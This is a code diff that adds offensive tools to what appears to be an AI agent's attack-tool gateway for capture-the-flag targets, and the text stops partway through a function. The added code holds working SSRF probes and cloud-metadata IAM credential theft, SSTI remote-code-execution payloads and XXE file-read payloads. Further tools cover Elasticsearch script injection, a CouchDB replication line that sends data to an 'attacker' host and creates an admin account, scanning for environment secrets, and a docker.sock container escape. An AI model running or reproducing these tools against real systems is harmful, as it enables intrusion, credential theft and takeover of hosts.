@@ -7,7 +7,10 @@ Reference: AWE xss_agent, sqli_agent — exploitation patterns
 from __future__ import annotations
 
 import asyncio
+import os as _os_module
+import random
 import re
+import string
 import time
 from pathlib import Path
 from typing import Any, Dict
@@ -525,6 +528,324 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "param": {"type": "string", "description": "Parameter to test for XSS"},
             "method": {"type": "string", "description": "HTTP method (GET or POST, default GET)"},
             "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
+        },
+    )
+
+    # ── SSRF probe: Internal service discovery via SSRF vector ─────
+    async def ssrf_probe(
+        ssrf_url: str, url_param: str = "url", port_param: str = "",
+        internal_hosts: str = "localhost,127.0.0.1,internal,metadata,169.254.169.254,0.0.0.0",
+        ports: str = "80,443,8080,5000,3000,8000,9200,5984,8500",
+        paths: str = "/,/flag,/flag.txt,/admin,/api,/health,/status,/metadata",
+    ) -> ToolResult:
+        """Discover internal services through an SSRF vector.
+
+        Given an SSRF endpoint (e.g. http://target/fetch?url=), probe internal
+        hosts, ports, and paths to discover services and extract data.
+        Returns responses including flags found.
+        """
+        import asyncio, time, urllib.parse, json as _json
+        start = time.perf_counter()
+        results: list[dict] = []
+        hosts = [h.strip() for h in internal_hosts.split(",") if h.strip()]
+        port_list = [p.strip() for p in ports.split(",") if p.strip()]
+        path_list = [p.strip() for p in paths.split(",") if p.strip()]
+
+        # Build probe URLs: if the SSRF endpoint takes a full URL, inject internal targets
+        probes: list[str] = []
+        for h in hosts[:8]:  # Limit to avoid excessive requests
+            for pt in port_list[:5]:
+                for p in path_list[:4]:
+                    inner = f"http://{h}:{pt}{p}"
+                    if "?" in ssrf_url:
+                        sep = "&" if "?" in ssrf_url else "?"
+                        probe_url = f"{ssrf_url}{sep}{url_param}={urllib.parse.quote(inner)}"
+                    else:
+                        # SSRF endpoint expects the URL appended
+                        if ssrf_url.endswith("/"):
+                            probe_url = f"{ssrf_url}?{url_param}={urllib.parse.quote(inner)}"
+                        else:
+                            probe_url = f"{ssrf_url}?{url_param}={urllib.parse.quote(inner)}"
+                    probes.append(probe_url)
+                    break  # One path per host:port combo
+                break  # One port per host initially (iterate if needed)
+
+        # Limit total probes
+        probes = probes[:30]
+        try:
+            for probe_url in probes:
+                try:
+                    cmd_line = f"curl -s --max-time 5 '{probe_url}' 2>&1"
+                    proc = await asyncio.create_subprocess_shell(
+                        cmd_line,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE)
+                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=8)
+                    stdout_s = stdout.decode("utf-8", errors="replace")
+                    if stdout_s.strip():
+                        # Check for flag in response
+                        import re
+                        flag_match = re.search(r'flag\{[^}]+\}', stdout_s)
+                        results.append({
+                            "probe": probe_url,
+                            "response_len": len(stdout_s),
+                            "response_preview": stdout_s[:500],
+                            "flag": flag_match.group(0) if flag_match else None,
+                        })
+                        # Stop if flag found
+                        if flag_match:
+                            break
+                except asyncio.TimeoutError:
+                    continue
+                except Exception:
+                    continue
+        except Exception:
+            pass
+
+        elapsed = (time.perf_counter() - start) * 1000
+        if results:
+            found_flags = [r for r in results if r.get("flag")]
+            summary = f"SSRF probe complete: {len(results)} responses, {len(found_flags)} flags found\n"
+            summary += _json.dumps(results, indent=2)
+            return ToolResult(
+                tool_name="ssrf_probe", success=True,
+                stdout=summary, stderr="",
+                exit_code=0, elapsed_ms=elapsed,
+            )
+        return ToolResult(
+            tool_name="ssrf_probe", success=False,
+            stdout="", stderr="No internal services discovered through SSRF vector",
+            exit_code=1, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="ssrf_probe",
+        func=ssrf_probe,
+        description="Discover internal services through an SSRF vector. Given an SSRF endpoint URL, probes common internal hosts (localhost, 127.0.0.1, internal, 169.254.169.254/cloud metadata) and ports for accessible services. Automatically extracts flags from responses. Use when web application has a URL fetch/proxy/redirect feature.",
+        parameters={
+            "ssrf_url": {"type": "string", "description": "The SSRF-vulnerable endpoint URL (e.g. 'http://target:10110/fetch')"},
+            "url_param": {"type": "string", "description": "URL parameter name for the SSRF query (default 'url')"},
+            "port_param": {"type": "string", "description": "Optional port parameter name if separate from url_param"},
+            "internal_hosts": {"type": "string", "description": "Comma-separated internal hosts to probe (default: localhost,127.0.0.1,internal,metadata,169.254.169.254)"},
+            "ports": {"type": "string", "description": "Comma-separated ports to probe (default: 80,443,8080,5000,3000)"},
+            "paths": {"type": "string", "description": "Comma-separated paths to probe (default: /,/flag,/flag.txt,/admin,/api)"},
+        },
+    )
+
+    # ── SSTI Injection Detection & Exploitation ──────────────────
+    async def ssti_inject(
+        target_url: str, param_name: str = "name",
+        method: str = "GET", template_engine: str = "jinja2",
+    ) -> ToolResult:
+        """Test for Server-Side Template Injection (SSTI) and attempt exploitation.
+
+        Sends math evaluation payloads to detect SSTI, then attempts RCE.
+        """
+        import asyncio, time, urllib.parse, urllib.request, json as _json, ssl
+
+        start = time.perf_counter()
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+
+        # SSTI detection payloads by engine
+        detect_payloads = {
+            "jinja2": "{{7*7}}",
+            "twig": "{{7*7}}",
+            "freemarker": "${7*7}",
+            "erb": "<%= 7*7 %>",
+            "velocity": "#set($x=7*7)$x",
+            "smarty": "{7*7}",
+        }
+        # RCE payloads
+        rce_payloads = {
+            "jinja2": [
+                "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}",
+                "{{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}",
+                "{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
+                "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
+            ],
+            "twig": [
+                "{{_self.env.getFilter('cat /flag.txt')}}",
+                "{{['cat /flag.txt']|filter('system')}}",
+            ],
+            "freemarker": [
+                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}',
+            ],
+            "erb": [
+                "<%= File.read('/flag.txt') %>",
+                "<%= IO.popen('cat /flag.txt').readlines() %>",
+            ],
+        }
+
+        results: list[dict] = []
+
+        # Step 1: Detection phase
+        engines_to_test = [template_engine] if template_engine != "all" else list(detect_payloads.keys())
+        detected = None
+
+        for engine in engines_to_test[:4]:
+            payload = detect_payloads.get(engine, "{{7*7}}")
+            try:
+                if method.upper() == "POST":
+                    data = urllib.parse.urlencode({param_name: payload}).encode()
+                    req = urllib.request.Request(target_url, data=data)
+                else:
+                    encoded = urllib.parse.quote(payload)
+                    req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")
+
+                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+                body = resp.read().decode("utf-8", errors="replace")
+
+                if "49" in body and "7*7" not in body:
+                    detected = engine
+                    results.append({"phase": "detect", "engine": engine, "payload": payload, "result": "SSTI confirmed — 7*7 evaluated to 49"})
+                    break
+                elif payload in body:
+                    results.append({"phase": "detect", "engine": engine, "payload": payload, "result": "payload reflected (possible SSTI if not raw)"})
+                else:
+                    results.append({"phase": "detect", "engine": engine, "payload": payload, "result": "no reflection"})
+            except Exception as e:
+                results.append({"phase": "detect", "engine": engine, "error": str(e)})
+
+        # Step 2: RCE phase (only if SSTI detected)
+        if detected and detected in rce_payloads:
+            for rce_payload in rce_payloads[detected][:4]:
+                try:
+                    if method.upper() == "POST":
+                        data = urllib.parse.urlencode({param_name: rce_payload}).encode()
+                        req = urllib.request.Request(target_url, data=data)
+                    else:
+                        encoded = urllib.parse.quote(rce_payload)
+                        req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")
+
+                    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+                    body = resp.read().decode("utf-8", errors="replace")
+
+                    import re
+                    flag_match = re.search(r'flag\{[^}]+\}', body)
+                    if flag_match:
+                        results.append({"phase": "exploit", "payload": rce_payload, "flag": flag_match.group(0)})
+                        break
+                    elif body.strip():
+                        results.append({"phase": "exploit", "payload": rce_payload, "response_len": len(body), "response_preview": body[:300]})
+                except Exception as e:
+                    results.append({"phase": "exploit", "payload": rce_payload, "error": str(e)})
+
+        elapsed = (time.perf_counter() - start) * 1000
+        found_flags = [r for r in results if r.get("flag")]
+        return ToolResult(
+            tool_name="ssti_inject", success=bool(found_flags),
+            stdout=_json.dumps(results, indent=2),
+            stderr="" if found_flags else "No SSTI detected or exploitation unsuccessful",
+            exit_code=0 if found_flags else 1, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="ssti_inject",
+        func=ssti_inject,
+        description="Test for Server-Side Template Injection (SSTI). Sends math evaluation payloads ({{7*7}}, ${7*7}, <%= 7*7 %>) to detect Jinja2/Twig/FreeMarker/ERB template injection. If SSTI is confirmed, attempts RCE via OS command execution to read flag files. Supports GET and POST methods.",
+        parameters={
+            "target_url": {"type": "string", "description": "Target URL or endpoint (e.g. 'http://target:10112/submit')"},
+            "param_name": {"type": "string", "description": "Parameter name that is injected into the template (default 'name')"},
+            "method": {"type": "string", "description": "HTTP method: GET (query string) or POST (form body). Default GET."},
+            "template_engine": {"type": "string", "description": "Template engine to target: jinja2, twig, freemarker, erb, or 'all' to auto-detect. Default jinja2."},
+        },
+    )
+
+    # ── XXE Injection & File Read ────────────────────────────────
+    async def xxe_inject(
+        target_url: str, read_file: str = "/flag.txt",
+        custom_xml: str = "", use_dtd: bool = False,
+    ) -> ToolResult:
+        """Send XXE (XML External Entity) payloads to read files or perform SSRF.
+
+        Constructs XXE payloads with external entity definitions and sends them
+        as application/xml. Extracts flag from response if found.
+        """
+        import asyncio, time, urllib.request, json as _json, ssl
+        start = time.perf_counter()
+
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+
+        # Build XXE payloads
+        payloads = []
+        if custom_xml:
+            payloads.append(custom_xml)
+
+        # Standard inline DTD file read (works without external DTD)
+        files_to_try = [read_file] if read_file else ["/flag.txt", "/FLAG.txt", "/etc/passwd", "C:\\flag.txt", "/flag"]
+        for f in files_to_try[:3]:
+            payloads.append(f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file://{f}">
+]>
+<root><data>&xxe;</data></root>''')
+
+        # Blind XXE with parameter entity (file read via external DTD)
+        if use_dtd:
+            payloads.append(f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file://{files_to_try[0] if files_to_try else '/flag.txt'}">
+  <!ENTITY % dtd SYSTEM "http://127.0.0.1:9999/evil.dtd">
+  %dtd;
+]>
+<root><data>test</data></root>''')
+
+        # SSRF via XXE
+        payloads.append('''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root><data>&xxe;</data></root>''')
+
+        results: list[dict] = []
+        for xml_body in payloads[:5]:
+            try:
+                data = xml_body.encode("utf-8")
+                req = urllib.request.Request(
+                    target_url, data=data,
+                    headers={"Content-Type": "application/xml"},
+                )
+                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+                body = resp.read().decode("utf-8", errors="replace")
+
+                import re
+                flag_match = re.search(r'flag\{[^}]+\}', body)
+                results.append({
+                    "payload_preview": xml_body[:200],
+                    "response_len": len(body),
+                    "response_preview": body[:500],
+                    "flag": flag_match.group(0) if flag_match else None,
+                })
+                if flag_match:
+                    break
+            except urllib.error.HTTPError as e:
+                err_body = e.read().decode("utf-8", errors="replace")
+                results.append({"error": f"HTTP {e.code}", "response": err_body[:300]})
+            except Exception as e:
+                results.append({"error": str(e)})
+
+        elapsed = (time.perf_counter() - start) * 1000
+        found_flags = [r for r in results if r.get("flag")]
+        return ToolResult(
+            tool_name="xxe_inject", success=bool(found_flags),
+            stdout=_json.dumps(results, indent=2),
+            stderr="" if found_flags else "No XXE exploitation successful",
+            exit_code=0 if found_flags else 1, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="xxe_inject",
+        func=xxe_inject,
+        description="Send XXE (XML External Entity) payloads to read files or perform SSRF. Constructs external entity definitions targeting file:// paths. Supports inline DTD file read and external DTD mode for blind XXE. Also probes SSRF via XXE to cloud metadata endpoint (169.254.169.254). Sends requests with Content-Type: application/xml.",
+        parameters={
+            "target_url": {"type": "string", "description": "Target URL that accepts XML input (e.g. 'http://target:10113/import')"},
+            "read_file": {"type": "string", "description": "File path to read via XXE (default '/flag.txt'). Try '/flag.txt', '/FLAG.txt', '/etc/passwd', 'C:\\\\flag.txt'."},
+            "custom_xml": {"type": "string", "description": "Custom XML body with XXE payload (optional — if empty, auto-generates standard payloads)"},
+            "use_dtd": {"type": "boolean", "description": "Enable blind XXE with parameter entity + external DTD (requires out-of-band server)"},
         },
     )
 
@@ -1087,6 +1408,54 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=30,
     )
+    # ── NoSQL Database Clients ────────────────────────────────────
+
+    gateway.register_shell_tool(
+        name="mongodb_query",
+        command_template="python3 -c \"\nimport json, sys\ntry:\n    from pymongo import MongoClient\n    client = MongoClient('mongodb://{user}:{password}@{host}:{port}/')\n    db = client['{database}']\n    # Parse and execute the query\n    query_obj = json.loads('''{query_json}''')\n    if isinstance(query_obj, dict):\n        results = list(db.command(query_obj)) if 'find' not in str(query_obj).lower() else list(db.command(json.loads('''{query_json}''')))\n    else:\n        results = list(db.command(query_obj))\n    print(json.dumps(results, default=str, indent=2))\nexcept ImportError:\n    print(json.dumps({'error': 'pymongo not installed, install with: pip install pymongo'}))\nexcept Exception as e:\n    print(json.dumps({'error': str(e)}))\n\" 2>&1",
+        description="Execute a MongoDB query or command. Supports NoSQL injection testing ($regex, $ne, $gt operators in query_json). For unauthenticated access, leave user and password empty. database: target DB name (e.g. 'admin', 'test'). query_json: JSON string of query or command (e.g. '{\"find\":\"users\",\"filter\":{\"username\":{\"$regex\":\".*\"}}}'). Use for MongoDB NoSQLi exploitation and unauthorized data access.",
+        parameters={
+            "host": {"type": "string", "description": "MongoDB host IP or hostname"},
+            "port": {"type": "integer", "description": "MongoDB port (default 27017)"},
+            "user": {"type": "string", "description": "MongoDB username. Leave empty for unauth access."},
+            "password": {"type": "string", "description": "MongoDB password. Leave empty for unauth access."},
+            "database": {"type": "string", "description": "MongoDB database name to query (e.g. 'admin', 'test', 'flagdb')"},
+            "query_json": {"type": "string", "description": "JSON query string (escaped properly for shell). Use MongoDB extended JSON format. Example: '{\"find\":\"users\",\"filter\":{}}' for listing collections. '{\"find\":\"users\",\"filter\":{\"$where\":\"sleep(5000)\"}}' for blind injection time-based."},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    gateway.register_shell_tool(
+        name="elasticsearch_query",
+        command_template="curl -s -X {method} 'http://{host}:{port}{path}' -H 'Content-Type: application/json' {body_json} 2>&1",
+        description="Query Elasticsearch REST API. Use for data extraction (search queries), index enumeration, and script injection attacks. method: GET for read, POST for search with body. path: API path (e.g. '/_cat/indices?v', '/_search', '/_cluster/health'). body_json: for POST, pass '-d {json}' with search body containing script_fields for script injection (Elasticsearch dynamic scripting). Unauth access common on default installations.",
+        parameters={
+            "host": {"type": "string", "description": "Elasticsearch host IP or hostname"},
+            "port": {"type": "integer", "description": "Elasticsearch port (default 9200)"},
+            "method": {"type": "string", "description": "HTTP method: GET, POST, PUT"},
+            "path": {"type": "string", "description": "API path (e.g. '/_cat/indices?v', '/_search', '/flag_index/_search')"},
+            "body_json": {"type": "string", "description": "For POST/PUT: body as JSON string, prefixed with '-d ' (e.g. '-d \\'{\"query\":{\"match_all\":{}}}\\''). Leave empty for GET requests. For script injection: '-d \\'{\"script_fields\":{\"rce\":{\"script\":\"Runtime.getRuntime().exec(\\\\\"id\\\\\")\"}}}\\''"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    gateway.register_shell_tool(
+        name="couchdb_query",
+        command_template="curl -s -X {method} 'http://{host}:{port}{path}' -H 'Content-Type: application/json' {body_json} 2>&1",
+        description="Interact with CouchDB REST API. Supports database enumeration ('/_all_dbs'), document access ('/db/doc_id'), user management ('/_users/org.couchdb.user:admin'), and replication trigger with privilege escalation ('/_replicate' — create admin user then replicate to gain access). Default port 5984. Many CouchDB instances allow unauthenticated access. Use the /_replicate endpoint with target pointing to a user DB for privilege escalation to create an admin account.",
+        parameters={
+            "host": {"type": "string", "description": "CouchDB host IP or hostname"},
+            "port": {"type": "integer", "description": "CouchDB port (default 5984)"},
+            "method": {"type": "string", "description": "HTTP method: GET, POST, PUT"},
+            "path": {"type": "string", "description": "API path (e.g. '/_all_dbs', '/_users/org.couchdb.user:admin', '/flagdb/_all_docs?include_docs=true', '/_replicate')"},
+            "body_json": {"type": "string", "description": "JSON body for POST/PUT requests. Example for replication attack: '-d \\'{\"source\":\"flagdb\",\"target\":\"http://attacker:5984/leaked\"}\\''. For user creation: '-d \\'{\"name\":\"admin\",\"password\":\"hacked\",\"roles\":[\"_admin\"],\"type\":\"user\"}\\''"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
     gateway.register_shell_tool(
         name="jwt_forge",
         command_template="python3 -c \"import jwt,json,time,base64; payload=json.loads(base64.b64decode('{claims_b64}').decode()); print(jwt.encode(payload,'{secret}',algorithm='{algorithm}'))\" 2>&1",
@@ -1098,6 +1467,102 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         },
         parser=_parse_shell_output,
         timeout=15,
+    )
+
+    # ── GraphQL Introspection & Query ───────────────────────────
+
+    async def graphql_introspect(
+        target_url: str, query_type: str = "introspection",
+        query_body: str = "",
+    ) -> ToolResult:
+        """Query GraphQL endpoints for schema discovery and data extraction.
+
+        Sends introspection or custom queries to GraphQL endpoints.
+        """
+        import json as _json, ssl, time, urllib.request
+
+        start = time.perf_counter()
+
+        # Introspection query (full schema dump)
+        introspection_query = (
+            '{__schema{types{name kind fields{name args{name type{name kind ofType{name}}}}'
+            'enumValues{name} inputFields{name type{name}} interfaces{name}} queryType{name}'
+            'mutationType{name} subscriptionType{name}}}'
+        )
+
+        if query_type == "introspection":
+            query = introspection_query
+        elif query_body:
+            query = query_body
+        else:
+            query = introspection_query
+
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+
+        try:
+            data = _json.dumps({"query": query}).encode()
+            req = urllib.request.Request(
+                target_url, data=data,
+                headers={"Content-Type": "application/json"},
+            )
+            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
+            body = resp.read().decode("utf-8", errors="replace")
+            result = _json.loads(body) if body.strip().startswith("{") else {"raw": body}
+        except Exception as e:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="graphql_introspect", success=False,
+                stdout="", stderr=str(e), exit_code=-1, elapsed_ms=elapsed,
+            )
+
+        # Extract queries and mutations for readable output
+        summary: list[dict] = []
+        if "data" in result and "__schema" in result.get("data", {}):
+            schema = result["data"]["__schema"]
+            query_type_name = schema.get("queryType", {}).get("name", "Query")
+            mutation_type_name = schema.get("mutationType", {}).get("name", "")
+
+            # Find query and mutation type objects
+            for t in schema.get("types", []):
+                if t.get("name") == query_type_name:
+                    summary.append({
+                        "type": "Query", "name": t["name"],
+                        "fields": [
+                            {"name": f["name"], "args": [a["name"] for a in f.get("args", [])]}
+                            for f in t.get("fields", [])
+                        ],
+                    })
+                if mutation_type_name and t.get("name") == mutation_type_name:
+                    summary.append({
+                        "type": "Mutation", "name": t["name"],
+                        "fields": [
+                            {"name": f["name"], "args": [a["name"] for a in f.get("args", [])]}
+                            for f in t.get("fields", [])
+                        ],
+                    })
+
+        elapsed = (time.perf_counter() - start) * 1000
+        output = _json.dumps({
+            "queries_and_mutations": summary,
+            "full_schema_summary": f"{len(result.get('data',{}).get('__schema',{}).get('types',[]))} types discovered",
+        }, indent=2)
+        return ToolResult(
+            tool_name="graphql_introspect", success=len(summary) > 0,
+            stdout=output, stderr="" if summary else "No schema discovered",
+            exit_code=0 if summary else 1, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="graphql_introspect",
+        func=graphql_introspect,
+        description="Query a GraphQL endpoint for schema discovery and data extraction. Introspection mode dumps the full schema — all types, queries, mutations, and their arguments. Use for IDOR discovery: look for queries accepting user IDs or other identifiers that can be manipulated. Custom queries can extract data from discovered types.",
+        parameters={
+            "target_url": {"type": "string", "description": "GraphQL endpoint URL (e.g. 'http://target:10116/graphql')"},
+            "query_type": {"type": "string", "description": "'introspection' for schema discovery, or 'query' to use custom query_body"},
+            "query_body": {"type": "string", "description": "Custom GraphQL query when query_type is 'query'. Example: '{getPrescriptions(userId:1){id medication}}'"},
+        },
     )
 
     # ── Active Directory Tools ─────────────────────────────────────
@@ -1869,6 +2334,22 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=30,
     )
 
+    # ── AWS Cloud CLI ────────────────────────────────────────────
+
+    gateway.register_shell_tool(
+        name="aws_cli",
+        command_template="aws {service} {action} {resource} {payload_json} --output json 2>&1",
+        description="Execute AWS CLI commands for cloud service exploitation. Supports S3 (s3 ls/cp/sync), IAM (iam list-roles/get-policy/attach-role-policy), STS (sts assume-role/get-caller-identity), KMS (kms decrypt/list-keys), Lambda (lambda list-functions/invoke), SQS (sqs list-queues/receive-message), DynamoDB (dynamodb list-tables/scan/query). Automatically uses IMDS credentials when running on EC2. For unauthenticated access to S3, add '--no-sign-request' to payload_json. Use service+action+resource pattern: aws_cli 's3' 'ls' 's3://bucket-name' '' for listing, aws_cli 'iam' 'list-roles' '' '' for enumeration.",
+        parameters={
+            "service": {"type": "string", "description": "AWS service: s3, iam, sts, kms, lambda, sqs, dynamodb"},
+            "action": {"type": "string", "description": "AWS CLI action: ls, cp, list-roles, get-policy, assume-role, decrypt, list-functions, invoke, list-queues, receive-message, list-tables, scan, query, get-caller-identity"},
+            "resource": {"type": "string", "description": "Resource identifier (e.g., 's3://bucket-name', 'role/role-name', '--function-name NAME', '--queue-url URL', '--table-name NAME'). Leave empty for list operations."},
+            "payload_json": {"type": "string", "description": "Additional flags, --query filters, or JSON payload. Examples: '--no-sign-request', '--role-session-name test', '--max-number-of-messages 10', '--filter-expression \"attribute_exists(flag)\"', '--query \"Buckets[].Name\"'"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
     # ── Kubernetes Tools ───────────────────────────────────────────
 
     gateway.register_shell_tool(
@@ -1903,13 +2384,61 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=30,
     )
-    gateway.register_shell_tool(
+    async def check_cloud_metadata() -> ToolResult:
+        """Check cloud metadata endpoints for multiple providers.
+
+        Probes AWS, GCP, Azure, Alicloud, and DigitalOcean metadata endpoints.
+        Enhanced from original single-AWS probe — now covers all major cloud platforms.
+        Extracts instance info, IAM credentials, and service account tokens.
+        """
+        endpoints = {
+            "AWS": "http://169.254.169.254/latest/meta-data/",
+            "AWS_IMDSv2": "http://169.254.169.254/latest/api/token",
+            "GCP": "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true",
+            "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "Alicloud": "http://100.100.100.200/latest/meta-data/",
+            "DigitalOcean": "http://169.254.169.254/metadata/v1.json",
+        }
+        results = []
+        import asyncio
+        for label, url in endpoints.items():
+            extra_headers = ""
+            if "GCP" in label:
+                extra_headers = "-H 'Metadata-Flavor: Google'"
+            elif "Azure" in label:
+                extra_headers = "-H 'Metadata: true'"
+            elif "AWS_IMDSv2" in label:
+                extra_headers = "-X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
+
+            r = await _run_shell(
+                f"curl -sf --connect-timeout 2 {extra_headers} '{url}' 2>/dev/null | head -50",
+                timeout=10,
+            )
+            if r.stdout.strip() and not r.stdout.strip().startswith("curl"):
+                results.append(f"[{label}] REACHABLE\n{r.stdout[:2000]}")
+            else:
+                results.append(f"[{label}] not-reachable")
+
+        # Also try to read IAM credentials from AWS
+        iam_r = await _run_shell(
+            "ROLE=$(curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -1); "
+            "if [ -n \"$ROLE\" ] && [ \"$ROLE\" != 'not-reachable' ]; then "
+            "echo \"IAM Role: $ROLE\"; "
+            "curl -sf --connect-timeout 2 \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\" 2>/dev/null | head -30; "
+            "fi",
+            timeout=10,
+        )
+        if iam_r.stdout.strip():
+            results.append(f"[AWS_IAM]\n{iam_r.stdout[:1000]}")
+
+        return ToolResult(tool_name="check_cloud_metadata", success=True,
+            stdout="\n\n".join(results), stderr="", exit_code=0, elapsed_ms=0)
+
+    gateway.register(
         name="check_cloud_metadata",
-        command_template="curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo 'not-reachable'",
-        description="Check if AWS IMDS cloud metadata endpoint is accessible (for cloud credential exfiltration)",
+        func=check_cloud_metadata,
+        description="Check cloud metadata endpoints for AWS, GCP, Azure, Alicloud, and DigitalOcean. Extracts instance info, IAM credentials, and service account tokens. Use when inside a container or VM on cloud infrastructure — cloud credentials can enable lateral movement to cloud services.",
         parameters={},
-        parser=_parse_shell_output,
-        timeout=30,
     )
     gateway.register_shell_tool(
         name="kubectl_get_pods",
@@ -2261,6 +2790,811 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "hash_string": {"type": "string", "description": "Complete hash string (e.g. $krb5tgs$23$*... for Kerberoast, $krb5asrep$23$*... for AS-REP, or 32-char hex for NTLM)"},
             "hash_type": {"type": "string", "description": "Optional hashcat mode number. Auto-detected from prefix if omitted. Common modes: 13100=Kerberoast, 18200=AS-REP, 1000=NTLM, 3200=bcrypt, 1800=SHA-512"},
             "timeout": {"type": "integer", "description": "Max cracking time in seconds (default 120, max 600)"},
+        },
+    )
+
+    # ── Container Recon ────────────────────────────────────────────
+    # Tools for discovering escape vectors inside a container.
+    # ALWAYS run these FIRST before any container escape attempt.
+
+    gateway.register_shell_tool(
+        name="container_find_sockets",
+        command_template="find {path} -type s 2>/dev/null | head -50",
+        description="Search for UNIX domain sockets on the filesystem. Use when inside a container to find docker.sock, containerd.sock, or other exploitable sockets. Common paths: /var/run, /run, /tmp. Differs from check_mounts — this finds sockets, not mount points.",
+        parameters={
+            "path": {"type": "string", "description": "Root path to start scanning from (default '/')"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    gateway.register_shell_tool(
+        name="container_find_docker",
+        command_template="echo '[1] Checking docker.sock...' && ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null; echo '[2] Scanning Docker TCP ports (2375,2376)...' && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null) | grep -E '2375|2376'; echo '[3] Checking DOCKER_HOST env...' && env 2>/dev/null | grep -i docker; echo '---DONE---'",
+        description="Locate Docker daemon via UNIX socket and TCP ports. Checks: (1) common docker.sock paths, (2) TCP ports 2375/2376, (3) DOCKER_HOST env var. Use after container_find_sockets to confirm Docker availability before escape.",
+        parameters={},
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    gateway.register_shell_tool(
+        name="container_recon_env",
+        command_template="echo '[ENV Secrets]' && env 2>/dev/null | grep -iE 'password|secret|token|key|cred|api|auth' | grep -v '^_='; echo '[ProcFS /proc/1/environ]' && (cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|token|key|cred|api|auth' || echo 'not-accessible'); echo '[ProcFS scan]' && for p in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -20); do found=$(cat /proc/$p/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|token|key' | head -2); if [ -n \"$found\" ]; then echo \"PID $p: $found\"; fi; done; echo '---DONE---'",
+        description="Scan container environment variables and /proc/*/environ for secrets (passwords, tokens, API keys, credentials). Use when inside a container to find credentials for lateral movement or cloud access. This is the container equivalent of linux_priv_check — discovers what's available before exploitation.",
+        parameters={},
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    # ── Container Escape ──────────────────────────────────────────
+    # Tools for breaking out of containers to the host.
+    # CRITICAL: Always run Container Recon tools FIRST to identify the
+    # escape vector, then pick the ONE matching tool below.
+
+    async def container_escape_docker_sock(
+        sock_path: str = "/var/run/docker.sock", shell_cmd: str = "id",
+        image: str = "alpine:latest", timeout_cmd: int = 60,
+    ) -> ToolResult:
+        """Escape container via exposed Docker socket.
+
+        Creates a privileged container with host root filesystem mounted
+        at /host, then executes shell_cmd on the host. Equivalent to CDK's
+        docker-sock-pwn. Requires write access to docker.sock.
+
+        Use when: container_find_sockets found docker.sock.
+        Post-escape: Read /host/flag*, /host/etc/shadow for host privesc.
+        """
+        import json as _json
+        container_config = _json.dumps({
+            "Image": image,
+            "Cmd": ["/bin/sh", "-c", shell_cmd],
+            "HostConfig": {
+                "Privileged": True,
+                "Binds": ["/:/host"],
+                "PidMode": "host",
+                "NetworkMode": "host",
+            },
+            "AttachStdout": True, "AttachStderr": True,
+        })
+        # Step 1: Pull image (tolerate failure if already present)
+        pull = await _run_shell(
+            f"curl -s --unix-socket {sock_path} -X POST "
+            f"'http://localhost/images/create?fromImage={image}' 2>&1 | tail -5",
+            timeout=30,
+        )
+        # Step 2: Create container
+        create = await _run_shell(
+            f"echo '{container_config}' | curl -s --unix-socket {sock_path} "
+            f"-X POST 'http://localhost/containers/create' "
+            f"-H 'Content-Type: application/json' -d @- 2>&1",
+            timeout=15,
